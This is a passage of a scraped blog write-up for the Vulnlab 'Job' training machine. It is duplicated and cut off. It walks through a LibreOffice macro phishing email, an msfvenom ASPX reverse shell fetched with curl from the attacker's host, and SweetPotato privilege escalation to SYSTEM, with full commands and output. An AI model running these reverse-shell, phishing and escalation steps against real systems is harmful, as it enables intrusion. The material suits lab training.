7/14/2024   5:57 PM             14 test.txt</span><br></pre></td></tr></table></figure>\n\n<p>This website seems to also be running through Windows IIS, and a simple <code>hello.aspx</code> file is being hosted on the webserver as well.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\inetpub\\wwwroot&gt; cat hello.aspx</span><br><span class=\"line\">&lt;%@ Page Language=&quot;c#&quot; AutoEventWireup=&quot;false&quot; CodeBehind=&quot;Default.aspx.vb&quot; %&gt;</span><br><span class=\"line\">&lt;html xmlns=&quot;www.w3.org/1999/xhtml&quot;&gt;</span><br><span class=\"line\">&lt;head runat=&quot;server&quot;&gt;</span><br><span class=\"line\">        &lt;title&gt;&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">        &lt;form id=&quot;form1&quot; runat=&quot;server&quot;&gt;</span><br><span class=\"line\">        &lt;div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;%Response. Write( &quot;Hello World&quot;); %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;/div&gt;</span><br><span class=\"line\">        &lt;/form&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>Browsing to this on the website, it seems that all this code is doing is printing out <code>Hello World</code> to the web page.</p>\n<p><img src=\"/images/vulnlab/job-vl/g.png\"></p>\n<p>I’ve dealt with IIS websites before, and I do recall that most exploits (or at least RCE) involve some form of ASPX or ASP reverse shell. Given that we have write access to the web application’s home directory, I’m assuming that we can simply just generate one and potentially get a callback as the backend user.</p>\n<p>We’ll generate an ASPX reverse shell with <code>msfvenom</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ msfvenom -p windows/x64/shell_reverse_tcp -ax64 -f aspx LHOST=10.8.0.173 LPORT=9002 &gt; daz.aspx</span><br><span class=\"line\">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class=\"line\">No encoder specified, outputting raw payload</span><br><span class=\"line\">Payload size: 460 bytes</span><br><span class=\"line\">Final size of aspx file: 3415 bytes</span><br></pre></td></tr></table></figure>\n\n<p>We’ll then transfer it to the local machine in the <code>wwwroot</code> directory, we can do this simply with a Python server - <code>python3 -m http.server 9005</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\inetpub\\wwwroot&gt; curl http://10.8.0.173:9005/daz.aspx -O daz.aspx</span><br><span class=\"line\">PS C:\\inetpub\\wwwroot&gt; ls</span><br><span class=\"line\"></span><br><span class=\"line\">Directory: C:\\inetpub\\wwwroot</span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name                   </span><br><span class=\"line\">----                 -------------         ------ ----                   </span><br><span class=\"line\">d-----        11/10/2021   8:52 PM                aspnet_client          </span><br><span class=\"line\">d-----         11/9/2021   9:24 PM                assets                 </span><br><span class=\"line\">d-----         11/9/2021   9:24 PM                css                    </span><br><span class=\"line\">d-----         11/9/2021   9:24 PM                js                     </span><br><span class=\"line\">-a----         7/14/2024   6:03 PM           3415 daz.aspx               </span><br><span class=\"line\">-a----        11/10/2021   9:01 PM            298 hello.aspx             </span><br><span class=\"line\">-a----         11/7/2021   1:05 PM           3261 index.html             </span><br><span class=\"line\">-a----         7/14/2024   5:57 PM             14 test.txt</span><br></pre></td></tr></table></figure>\n\n<p>We’ll then set up another listener on <code>nc -lvnp 9002</code> based on our <code>msfvenom</code> payload and browse to the file on the webpage.</p>\n<p><img src=\"/images/vulnlab/job-vl/h.png\"></p>\n<p>As you can see, our listener called back and we received a new shell as <code>defaultapppool</code>.</p>\n<h1 id=\"Exploiting-SeImpersonatePrivilege\"><a href=\"#Exploiting-SeImpersonatePrivilege\" class=\"headerlink\" title=\"Exploiting SeImpersonatePrivilege\"></a>Exploiting SeImpersonatePrivilege</h1><p>Upon checking our privileges as this user, it seems that we have <code>SeImpersonatePrivilege</code> set.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">c:\\windows\\system32\\inetsrv&gt;whoami /priv</span><br><span class=\"line\">whoami /priv</span><br><span class=\"line\"></span><br><span class=\"line\">PRIVILEGES INFORMATION</span><br><span class=\"line\">----------------------</span><br><span class=\"line\"></span><br><span class=\"line\">Privilege Name                Description                               State   </span><br><span class=\"line\">============================= ========================================= ========</span><br><span class=\"line\">SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled</span><br><span class=\"line\">SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled</span><br><span class=\"line\">SeAuditPrivilege              Generate security audits                  Disabled</span><br><span class=\"line\">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled </span><br><span class=\"line\">SeImpersonatePrivilege        Impersonate a client after authentication Enabled </span><br><span class=\"line\">SeCreateGlobalPrivilege       Create global objects                     Enabled </span><br><span class=\"line\">SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled</span><br></pre></td></tr></table></figure>\n\n<p>I’ve exploited this privilege several times before, and the end result should be no different here. I’ll give a short snippet as to how this command works with the service account that we currently have access to.</p>\n<p>Service accounts, by default, will have this privilege along with SeAssignPrimaryTokenPrivilege. Having SeImpersonatePrivilege essentially allows our service account to impersonate a user or specified user to perform actions on behalf of that user.</p>\n<p>We can impersonate SYSTEM and authenticate to an evil named pipe that we create. We’ll then direct this named pipe to a binary to execute, which will run in the context of SYSTEM.</p>\n<p>I ran a simple test to see if AV was enabled on this machine, and it seems that it is not.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\windows\\system32\\inetsrv&gt; &quot;Invoke-Mimikatz&quot;</span><br><span class=\"line\">&quot;Invoke-Mimikatz&quot;</span><br><span class=\"line\">Invoke-Mimikatz</span><br></pre></td></tr></table></figure>\n\n<p>In that case, we should be able to use <a href=\"https://github.com/CCob/SweetPotato\">SweetPotato</a> to generate this authentication coercion from SYSTEM. Had Defender been enabled, I would have used the loader that I had used in Breach to execute this application in memory. You can download a precompiled version of <code>SweetPotato</code> through the GitHub repository, or compile the source code with Visual Studio.</p>\n<p>We’ll then generate a new powershell executable payload with <code>msfvenom</code>, as seen below.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ msfvenom -p windows/x64/shell_reverse_tcp -ax64 -f exe LHOST=10.8.0.173 LPORT=9003 &gt; daz.exe</span><br><span class=\"line\">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class=\"line\">No encoder specified, outputting raw payload</span><br><span class=\"line\">Payload size: 460 bytes</span><br><span class=\"line\">Final size of exe file: 7168 bytes</span><br></pre></td></tr></table></figure>\n\n<p>We can then upload both <code>SweetPotato</code> and our <code>msfvenom</code> reverse shell to the machine using our Python server. We can then start up our netcat listener on port <code>9003</code> as seen from our payload attributes above. (<code>nc -lvnp 9003</code>)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\temp&gt; curl http://10.8.0.173:9001/SweetPotato.exe -O SweetPotato.exe</span><br><span class=\"line\">PS C:\\temp&gt; curl http://10.8.0.173:9001/daz.exe -O daz.exe</span><br><span class=\"line\">PS C:\\temp&gt; ls</span><br><span class=\"line\"></span><br><span class=\"line\">Directory: C:\\temp</span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name                                                 </span><br><span class=\"line\">----                 -------------         ------ ----                                                 </span><br><span class=\"line\">-a----         7/14/2024   6:14 PM           7168 daz.exe                                              </span><br><span class=\"line\">-a----         7/14/2024   6:13 PM         926208 SweetPotato.exe</span><br></pre></td></tr></table></figure>\n\n<p>Now that everything is set up, we’ll run <code>SweetPotato</code> and point it to execute <code>PowerShell</code> on an evil-named pipe that points to our reverse shell.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\temp&gt; .\\SweetPotato.exe -p C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -a &#x27;C:\\temp\\daz.exe&#x27; -e EfsRpc</span><br><span class=\"line\">SweetPotato by @_EthicalChaos_</span><br><span class=\"line\">  Orignal RottenPotato code and exploit by @foxglovesec</span><br><span class=\"line\">  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery</span><br><span class=\"line\">  PrintSpoofer discovery and original exploit by @itm4n</span><br><span class=\"line\">  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam</span><br><span class=\"line\">[+] Attempting NP impersonation using method EfsRpc to launch C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</span><br><span class=\"line\">[+] Triggering name pipe access on evil PIPE \\\\localhost/pipe/cb0eb314-002c-4c3d-9139-361e75c14e29/\\cb0eb314-002c-4c3d-9139-361e75c14e29\\cb0eb314-002c-4c3d-9139-361e75c14e29</span><br><span class=\"line\">[+] Server connected to our evil RPC pipe</span><br><span class=\"line\">[+] Duplicated impersonation token ready for process creation</span><br><span class=\"line\">[+] Intercepted and authenticated successfully, launching program</span><br><span class=\"line\">[+] Process created, enjoy!</span><br></pre></td></tr></table></figure>\n\n<p>If we look back at our third netcat listener, we’ll see that a successful session was spawned as <code>SYSTEM</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ nc -lvnp 9003               </span><br><span class=\"line\">listening on [any] 9003 ...</span><br><span class=\"line\">connect to [10.8.0.173] from (UNKNOWN) [10.10.105.93] 53394</span><br><span class=\"line\">Microsoft Windows [Version 10.0.20348.350]</span><br><span class=\"line\">(c) Microsoft Corporation. All rights reserved.</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Windows\\system32&gt;whoami</span><br><span class=\"line\">whoami</span><br><span class=\"line\">nt authority\\system</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have a shell as <code>SYSTEM</code>, we have successfully compromised this machine and can read the root flag underneath <code>C:\\Users\\Administrator\\Desktop\\root.txt</code>!</p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This box tested some knowledge of previous machines that I had done before, notably <code>SeImpersonatePrivilege</code> along with IIS exploitation through ASPX reverse shells. The LibreOffice exploitation was new, however I have set up VBA macros in the past so it was helpful to strengthen those skills.</p>\n<p>Big thanks to xct for the development of this machine.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://www.libreoffice.org/get-help/install-howto/\">https://www.libreoffice.org/get-help/install-howto/</a><br><a href=\"https://ask.libreoffice.org/t/how-to-use-shell-from-basic-macro-solved/23590\">https://ask.libreoffice.org/t/how-to-use-shell-from-basic-macro-solved/23590</a><br><a href=\"https://www.revshells.com/\">https://www.revshells.com/</a><br><a href=\"https://github.com/CCob/SweetPotato\">https://github.com/CCob/SweetPotato</a></p>\n","cover_type":"img","excerpt":"","more":"<p>Job is one of the older machines from Vulnlab that consisted of tactics generally seen on the OSCP. This is great practice for the exam, and involves LibreOffice macros in email servers along with an interesting privilege escalation path. I’ll try to avoid using C2’s for this machine just to stay in-line with OSCP rules.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>So let’s first start with our NMAP scan. Our entry point for this machine is <code>10.10.105.93</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ sudo nmap 10.10.105.93</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-14 12:50 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.105.93</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 996 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">25/tcp   open  smtp</span><br><span class=\"line\">80/tcp   open  http</span><br><span class=\"line\">445/tcp  open  microsoft-ds</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 18.62 seconds</span><br></pre></td></tr></table></figure>\n\n<p>It looks to be a Windows machine that is not a DC, so we can assume that it is a workstation. There seems to be an email service along with a website, so we can potentially look to those first for our initial foothold.</p>\n<p>Just for a service test, I also ran a test against SMB to see if null authentication was enabled.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ smbclient -L 10.10.105.93 -N         </span><br><span class=\"line\">session setup failed: NT_STATUS_ACCESS_DENIED</span><br></pre></td></tr></table></figure>\n\n<p>It seems that the entry point will most definitely be through either the SMTP server or through the web server. Let’s take a look at the website first to see if there are any leads to exploit.</p>\n<p><img src=\"/images/vulnlab/job-vl/b.png\"></p>\n<p>The website looks to be a job application frontpage calling for developer applications. The message from the front seems to give us a potential email for our attack path, <code>career@job.local</code>. Furthermore, the page tells us to send our CV as a LibreOffice document.</p>\n<p>There doesn’t seem to be much here aside from this page, I made sure to run a VHOST scan for other subdomains and a directory enumeration scan - though I came back with nothing.</p>\n<p>Looking at SMTP, it seems as though the server seems to have open relay enabled.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ telnet 10.10.105.93 25</span><br><span class=\"line\">Trying 10.10.105.93...</span><br><span class=\"line\">Connected to 10.10.105.93.</span><br><span class=\"line\">Escape character is &#x27;^]&#x27;.</span><br><span class=\"line\">220 JOB ESMTP</span><br><span class=\"line\">HELP</span><br><span class=\"line\">211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"LibreOffice-Macro-RCE\"><a href=\"#LibreOffice-Macro-RCE\" class=\"headerlink\" title=\"LibreOffice Macro RCE\"></a>LibreOffice Macro RCE</h1><p>At this point, the attack path is relatively clear. Assuming that we have nothing else to exploit on the webpage aside from the email, it seems that SMTP is the main part of the attack path. We have an email that we can send documents to, so the first part of this should be phishing.</p>\n<p>Given what the webpage is telling us, it should only be accepting LibreOffice documents with a <code>.odt</code> extension. I’m assuming that the backend (since this is a lab) is going to immediately open our document when we send it to view its contents.</p>\n<p>This phishing portion is an exploit directly targeted at LibreOffice - as you can essentially get RCE directly from a LibreOffice macro. Macros can be used to run shell commands directly upon opening the LibreOffice document, and are one of the (if not, the most) commonly seen vulnerability in LibreOffice.</p>\n<p>We can set up LibreOffice Writer locally to create this macro, to which I used my Windows host to create this. LibreOffice has been difficult to set up on my Kali host in my past experiences, so I decided to opt for my Windows machine for this. You can find the installation page <a href=\"https://www.libreoffice.org/get-help/install-howto/\">here</a>.</p>\n<p>Once everything is installed and ready to go, we should be able to open our LibreOffice Writer editor.</p>\n<p><img src=\"/images/vulnlab/job-vl/c.png\"></p>\n<p>I made a short cover letter that is mostly fake, just to have some fun with this lab. I also saved this as a <code>.odt</code> file named <code>daz_smith_CV.odt</code>. </p>\n<p>The front text doesn’t really matter as to what we put on it, as the main part of this exploit consists within the <code>Macros</code> section of LibreOffice.</p>\n<p>You can access this by going to <code>Tools &gt; Macros &gt; Organize Macros &gt; Macros</code>. Select on the name of your document and click on <code>New</code>. We’ll name this macro <code>AO</code> for “AutoOpen”.</p>\n<p><img src=\"/images/vulnlab/job-vl/d.png\"></p>\n<p>This will spawn a LibreOffice Basic editor with your macro pane on the right side of the application. The foundation for our macro is ready, all we need to do is create a Shell macro so that LibreOffice can execute commands from this macro.</p>\n<p>This forum page details how we can set up shell macros, they are relatively simple and involve wrapping our commands inside a <code>Shell()</code> call. We’ll also be looking to execute a reverse shell, to which I opted to use a Base64 encoded Powershell reverse shell crafted from <a href=\"https://www.revshells.com/\">revshells.com</a>.</p>\n<p><img src=\"/images/vulnlab/job-vl/e.png\"></p>\n<p>In order to make this macro execute upon opening the document, we’ll need to set the AutoOpen feature to open this document automatically. We can access this (from the LibreOffice Writer window, not the Macro window) in <code>Tools &gt; Customize</code>. Select <code>OpenDocument</code> from the <code>Events</code> list and select the macro that we just created.</p>\n<p>From here, our document should be ready to exploit. You can test that this works by reopening the document, and a PowerShell pane should be seen briefly as soon as you open it. Since we’re on our Windows host and don’t have a listener running, this won’t do anything - though you’ll know that it should be working.</p>\n<p>With that, we’ll transfer this back to our Kali system and set up a netcat listener on the port that our PowerShell reverse shell going to call back to. In my case, I’ll do <code>nc -lvnp 9001</code>.</p>\n<p>We’ll now need a way to send this through SMTP, which can be trivial dependent on the tools you have access to. By default, the most up-to-date version of Kali should have the <code>sendemail</code> tool installed - which makes emails submitted through SMTP easy to submit. You could also opt to use <code>swaks</code>, though I could not seem to get that tool working on my end.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ sendemail -s job.local -f &quot;daz &lt;daz@daz.daz&gt;&quot; -t career@job.local -o tls=no -m &quot;Please see the attached for my cover letter. \\n\\nV/R.,\\n\\nDaZ Smith&quot; -a daz_smith_CV.odt</span><br></pre></td></tr></table></figure>\n\n<p>I also made sure to set <code>job.local</code> to our IP address of <code>10.10.105.93</code> just so that it can resolve properly to the workstation. Let’s send our email and wait for a result on our listener.</p>\n<p>After a few seconds, we should get a shell back as <code>jack.black</code>.</p>\n<p><img src=\"/images/vulnlab/job-vl/f.png\"></p>\n<p>The user flag is within the users <code>Desktop</code> directory, meaning we have compromised the first half of this machine.</p>\n<h1 id=\"Privilege-Escalation-Through-Writable-Directories\"><a href=\"#Privilege-Escalation-Through-Writable-Directories\" class=\"headerlink\" title=\"Privilege Escalation Through Writable Directories\"></a>Privilege Escalation Through Writable Directories</h1><p>At this point, given that we are not within an AD environment - I would assume that the next part of privilege escalation would either be credential hunting or internal application exploitation.</p>\n<p>There doesn’t seem to be much for the <code>jack.black</code> user in their home directory (nor any cached credentials in their home folder), and they do not seem to have any notable privileges on this workstation.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\&gt; whoami /priv</span><br><span class=\"line\"></span><br><span class=\"line\">PRIVILEGES INFORMATION</span><br><span class=\"line\">----------------------</span><br><span class=\"line\"></span><br><span class=\"line\">Privilege Name                Description                    State   </span><br><span class=\"line\">============================= ============================== ========</span><br><span class=\"line\">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled </span><br><span class=\"line\">SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</span><br></pre></td></tr></table></figure>\n\n<p>I checked the <code>C:\\</code> root directory and it seems that the web server itself is being hosted within the <code>inetpub</code> page. I have confirmed that this is the website as the <code>index.html</code> page within <code>wwwroot</code> seems to be identical to the webpage we visited at the start of this machine.</p>\n<p>I did however notice that we have write access to this directory upon uploading a simple <code>test.txt</code> file.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\inetpub\\wwwroot&gt; echo &quot;test&quot; &gt; test.txt</span><br><span class=\"line\">PS C:\\inetpub\\wwwroot&gt; ls</span><br><span class=\"line\"></span><br><span class=\"line\">Directory: C:\\inetpub\\wwwroot</span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name                   </span><br><span class=\"line\">----                 -------------         ------ ----                   </span><br><span class=\"line\">d-----        11/10/2021   8:52 PM                aspnet_client          </span><br><span class=\"line\">d-----         11/9/2021   9:24 PM                assets                 </span><br><span class=\"line\">d-----         11/9/2021   9:24 PM                css                    </span><br><span class=\"line\">d-----         11/9/2021   9:24 PM                js                     </span><br><span class=\"line\">-a----        11/10/2021   9:01 PM            298 hello.aspx             </span><br><span class=\"line\">-a----         11/7/2021   1:05 PM           3261 index.html             </span><br><span class=\"line\">-a----         7/14/2024   5:57 PM             14 test.txt</span><br></pre></td></tr></table></figure>\n\n<p>This website seems to also be running through Windows IIS, and a simple <code>hello.aspx</code> file is being hosted on the webserver as well.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\inetpub\\wwwroot&gt; cat hello.aspx</span><br><span class=\"line\">&lt;%@ Page Language=&quot;c#&quot; AutoEventWireup=&quot;false&quot; CodeBehind=&quot;Default.aspx.vb&quot; %&gt;</span><br><span class=\"line\">&lt;html xmlns=&quot;www.w3.org/1999/xhtml&quot;&gt;</span><br><span class=\"line\">&lt;head runat=&quot;server&quot;&gt;</span><br><span class=\"line\">        &lt;title&gt;&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">        &lt;form id=&quot;form1&quot; runat=&quot;server&quot;&gt;</span><br><span class=\"line\">        &lt;div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;%Response. Write( &quot;Hello World&quot;); %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;/div&gt;</span><br><span class=\"line\">        &lt;/form&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>Browsing to this on the website, it seems that all this code is doing is printing out <code>Hello World</code> to the web page.</p>\n<p><img src=\"/images/vulnlab/job-vl/g.png\"></p>\n<p>I’ve dealt with IIS websites before, and I do recall that most exploits (or at least RCE) involve some form of ASPX or ASP reverse shell. Given that we have write access to the web application’s home directory, I’m assuming that we can simply just generate one and potentially get a callback as the backend user.</p>\n<p>We’ll generate an ASPX reverse shell with <code>msfvenom</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ msfvenom -p windows/x64/shell_reverse_tcp -ax64 -f aspx LHOST=10.8.0.173 LPORT=9002 &gt; daz.aspx</span><br><span class=\"line\">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class=\"line\">No encoder specified, outputting raw payload</span><br><span class=\"line\">Payload size: 460 bytes</span><br><span class=\"line\">Final size of aspx file: 3415 bytes</span><br></pre></td></tr></table></figure>\n\n<p>We’ll then transfer it to the local machine in the <code>wwwroot</code> directory, we can do this simply with a Python server - <code>python3 -m http.server 9005</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\inetpub\\wwwroot&gt; curl http://10.8.0.173:9005/daz.aspx -O daz.aspx</span><br><span class=\"line\">PS C:\\inetpub\\wwwroot&gt; ls</span><br><span class=\"line\"></span><br><span class=\"line\">Directory: C:\\inetpub\\wwwroot</span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name                   </span><br><span class=\"line\">----                 -------------         ------ ----                   </span><br><span class=\"line\">d-----        11/10/2021   8:52 PM                aspnet_client          </span><br><span class=\"line\">d-----         11/9/2021   9:24 PM                assets                 </span><br><span class=\"line\">d-----         11/9/2021   9:24 PM                css                    </span><br><span class=\"line\">d-----         11/9/2021   9:24 PM                js                     </span><br><span class=\"line\">-a----         7/14/2024   6:03 PM           3415 daz.aspx               </span><br><span class=\"line\">-a----        11/10/2021   9:01 PM            298 hello.aspx             </span><br><span class=\"line\">-a----         11/7/2021   1:05 PM           3261 index.html             </span><br><span class=\"line\">-a----         7/14/2024   5:57 PM             14 test.txt</span><br></pre></td></tr></table></figure>\n\n<p>We’ll then set up another listener on <code>nc -lvnp 9002</code> based on our <code>msfvenom</code> payload and browse to the file on the webpage.</p>\n<p><img src=\"/images/vulnlab/job-vl/h.png\"></p>\n<p>As you can see, our listener called back and we received a new shell as <code>defaultapppool</code>.</p>\n<h1 id=\"Exploiting-SeImpersonatePrivilege\"><a href=\"#Exploiting-SeImpersonatePrivilege\" class=\"headerlink\" title=\"Exploiting SeImpersonatePrivilege\"></a>Exploiting SeImpersonatePrivilege</h1><p>Upon checking our privileges as this user, it seems that we have <code>SeImpersonatePrivilege</code> set.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">c:\\windows\\system32\\inetsrv&gt;whoami /priv</span><br><span class=\"line\">whoami /priv</span><br><span class=\"line\"></span><br><span class=\"line\">PRIVILEGES INFORMATION</span><br><span class=\"line\">----------------------</span><br><span class=\"line\"></span><br><span class=\"line\">Privilege Name                Description                               State   </span><br><span class=\"line\">============================= ========================================= ========</span><br><span class=\"line\">SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled</span><br><span class=\"line\">SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled</span><br><span class=\"line\">SeAuditPrivilege              Generate security audits                  Disabled</span><br><span class=\"line\">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled </span><br><span class=\"line\">SeImpersonatePrivilege        Impersonate a client after authentication Enabled </span><br><span class=\"line\">SeCreateGlobalPrivilege       Create global objects                     Enabled </span><br><span class=\"line\">SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled</span><br></pre></td></tr></table></figure>\n\n<p>I’ve exploited this privilege several times before, and the end result should be no different here. I’ll give a short snippet as to how this command works with the service account that we currently have access to.</p>\n<p>Service accounts, by default, will have this privilege along with SeAssignPrimaryTokenPrivilege. Having SeImpersonatePrivilege essentially allows our service account to impersonate a user or specified user to perform actions on behalf of that user.</p>\n<p>We can impersonate SYSTEM and authenticate to an evil named pipe that we create. We’ll then direct this named pipe to a binary to execute, which will run in the context of SYSTEM.</p>\n<p>I ran a simple test to see if AV was enabled on this machine, and it seems that it is not.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\windows\\system32\\inetsrv&gt; &quot;Invoke-Mimikatz&quot;</span><br><span class=\"line\">&quot;Invoke-Mimikatz&quot;</span><br><span class=\"line\">Invoke-Mimikatz</span><br></pre></td></tr></table></figure>\n\n<p>In that case, we should be able to use <a href=\"https://github.com/CCob/SweetPotato\">SweetPotato</a> to generate this authentication coercion from SYSTEM. Had Defender been enabled, I would have used the loader that I had used in Breach to execute this application in memory. You can download a precompiled version of <code>SweetPotato</code> through the GitHub repository, or compile the source code with Visual Studio.</p>\n<p>We’ll then generate a new powershell executable payload with <code>msfvenom</code>, as seen below.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ msfvenom -p windows/x64/shell_reverse_tcp -ax64 -f exe LHOST=10.8.0.173 LPORT=9003 &gt; daz.exe</span><br><span class=\"line\">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class=\"line\">No encoder specified, outputting raw payload</span><br><span class=\"line\">Payload size: 460 bytes</span><br><span class=\"line\">Final size of exe file: 7168 bytes</span><br></pre></td></tr></table></figure>\n\n<p>We can then upload both <code>SweetPotato</code> and our <code>msfvenom</code> reverse shell to the machine using our Python server. We can then start up our netcat listener on port <code>9003</code> as seen from our payload attributes above. (<code>nc -lvnp 9003</code>)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\temp&gt; curl http://10.8.0.173:9001/SweetPotato.exe -O SweetPotato.exe</span><br><span class=\"line\">PS C:\\temp&gt; curl http://10.8.0.173:9001/daz.exe -O daz.exe</span><br><span class=\"line\">PS C:\\temp&gt; ls</span><br><span class=\"line\"></span><br><span class=\"line\">Directory: C:\\temp</span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name                                                 </span><br><span class=\"line\">----                 -------------         ------ ----                                                 </span><br><span class=\"line\">-a----         7/14/2024   6:14 PM           7168 daz.exe                                              </span><br><span class=\"line\">-a----         7/14/2024   6:13 PM         926208 SweetPotato.exe</span><br></pre></td></tr></table></figure>\n\n<p>Now that everything is set up, we’ll run <code>SweetPotato</code> and point it to execute <code>PowerShell</code> on an evil-named pipe that points to our reverse shell.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\temp&gt; .\\SweetPotato.exe -p C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -a &#x27;C:\\temp\\daz.exe&#x27; -e EfsRpc</span><br><span class=\"line\">SweetPotato by @_EthicalChaos_</span><br><span class=\"line\">  Orignal RottenPotato code and exploit by @foxglovesec</span><br><span class=\"line\">  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery</span><br><span class=\"line\">  PrintSpoofer discovery and original exploit by @itm4n</span><br><span class=\"line\">  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam</span><br><span class=\"line\">[+] Attempting NP impersonation using method EfsRpc to launch C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</span><br><span class=\"line\">[+] Triggering name pipe access on evil PIPE \\\\localhost/pipe/cb0eb314-002c-4c3d-9139-361e75c14e29/\\cb0eb314-002c-4c3d-9139-361e75c14e29\\cb0eb314-002c-4c3d-9139-361e75c14e29</span><br><span class=\"line\">[+] Server connected to our evil RPC pipe</span><br><span class=\"line\">[+] Duplicated impersonation token ready for process creation</span><br><span class=\"line\">[+] Intercepted and authenticated successfully, launching program</span><br><span class=\"line\">[+] Process created, enjoy!</span><br></pre></td></tr></table></figure>\n\n<p>If we look back at our third netcat listener, we’ll see that a successful session was spawned as <code>SYSTEM</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ nc -lvnp 9003               </span><br><span class=\"line\">listening on [any] 9003 ...</span><br><span class=\"line\">connect to [10.8.0.173] from (UNKNOWN) [10.10.105.93] 53394</span><br><span class=\"line\">Microsoft Windows [Version 10.0.20348.350]</span><br><span class=\"line\">(c) Microsoft Corporation. All rights reserved.</span><br><span class=\"line\"></span><br><span 